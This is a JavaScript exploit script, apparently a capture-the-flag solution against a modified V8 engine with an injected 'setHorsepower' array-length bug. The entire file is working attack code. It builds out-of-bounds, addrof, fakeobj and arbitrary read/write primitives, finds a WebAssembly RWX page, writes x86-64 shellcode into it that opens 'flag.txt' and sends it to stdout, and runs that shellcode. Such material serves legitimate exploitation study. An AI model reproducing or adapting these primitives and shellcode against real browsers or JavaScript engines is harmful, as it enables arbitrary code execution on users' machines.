/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// var a = [1.1, 2.2, 3.3, 4.4];
// a.setHorsepower(10);


let caca = new ArrayBuffer(0x100);
var wasm_bytecode = new Uint8Array([0,97,115,109,1,0,0,0,1,18,4,96,0,0,96,2,127,127,1,127,96,1,127,0,96,0,1,127,3,5,4,0,1,2,3,4,5,1,112,1,2,2,5,6,1,1,130,2,130,2,6,8,1,127,1,65,128,136,4,11,7,117,6,6,109,101,109,111,114,121,2,0,3,97,100,100,0,1,25,95,95,105,110,100,105,114,101,99,116,95,102,117,110,99,116,105,111,110,95,116,97,98,108,101,1,0,11,95,105,110,105,116,105,97,108,105,122,101,0,0,25,95,101,109,115,99,114,105,112,116,101,110,95,115,116,97,99,107,95,114,101,115,116,111,114,101,0,2,28,101,109,115,99,114,105,112,116,101,110,95,115,116,97,99,107,95,103,101,116,95,99,117,114,114,101,110,116,0,3,9,7,1,0,65,1,11,1,0,10,25,4,3,0,1,11,7,0,32,0,32,1,106,11,6,0,32,0,36,0,11,4,0,35,0,11]);
var wasm_mod = new WebAssembly.Module(wasm_bytecode);
var wasm_instance = new WebAssembly.Instance(wasm_mod);

var editor = [1.1, 2.2, 3.3, 4.4];
let float_arr = [9.6, 9.6, 9.6];
var obj_arr = [{a: 1}, 6.9];
editor.setHorsepower(1000);
var editor_map = ftoi(editor[4]) & 0xffffffffn;
console.log("[+] Float array map: " + editor_map.toString(16));

// %DebugPrint(float_arr);
// %DebugPrint(obj_arr);
// // search
// for (let i = 0; i < 100; i++) {
//     console.log(i + ": " + ftoi_hex(editor[i]));
// }

let float_arr_idx = 10;
let obj_arr_idx = 20;
let float_arr_leak = ftoi(editor[float_arr_idx]);
let float_arr_map = float_arr_leak & 0xffffffffn;
let float_arr_prop = float_arr_leak >> 32n;
console.log("[+] Float array map: " + float_arr_map.toString(16));

function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(editor[13]);
}

function fakeobj(addr) {
    editor[13] = itof(addr);
    return obj_arr[0];
}

let arb_rw_arr = [itof(float_arr_leak), 2.2, 3.3, 4.4];
function arbread(addr) {
    // tag the pointer
    if (addr % 2n == 0) {
        addr += 1n;
    }
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    console.log("Address of fake object: " + addrof(fake).toString(16));
    // %DebugPrint(fake);
    let ans = ftoi(fake[0]);
    arb_rw_arr[1] = 2.2;
    return ans;
}

function initial_arb_write(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    console.log("Writing " + val.toString(16) + " to " + addr.toString(16));
    console.log("address of fake object: " + addrof(fake).toString(16));
    // %DebugPrint(fake);
    fake[0] = itof(val);
}

// var f = wasm_instance.exports.add;

// let aux_obj = [wasm_instance];
// console.log("[+] Aux object at: " + addrof(aux_obj).toString(16));
// var elements_ptr = arbread(addrof(aux_obj) + 0x8n);
// console.log("[+] Elements pointer: " + elements_ptr.toString(16));
// %DebugPrint(aux_obj);

console.log("[+] WASM instance @: " + (addrof(wasm_instance) & 0xffffffffn).toString(16));
let rwx_page = arbread(addrof(wasm_instance) + 0x68n);
console.log("[+] RWX page @: " + rwx_page.toString(16));

// write shellcode to RWX page using Array buffer
let dataview = new DataView(caca);
// set backing store to RWX page
initial_arb_write(addrof(caca) + 0x14n, rwx_page);

// obj_arr[0] = {a: 1};
let shellcode = [144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,106,1,254,12,36,72,184,102,108,97,103,46,116,120,116,80,106,2,88,72,137,231,49,246,15,5,65,186,255,255,255,127,72,137,198,106,40,88,106,1,95,153,15,5,];

for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}

let pwn = wasm_instance.exports.add;
pwn();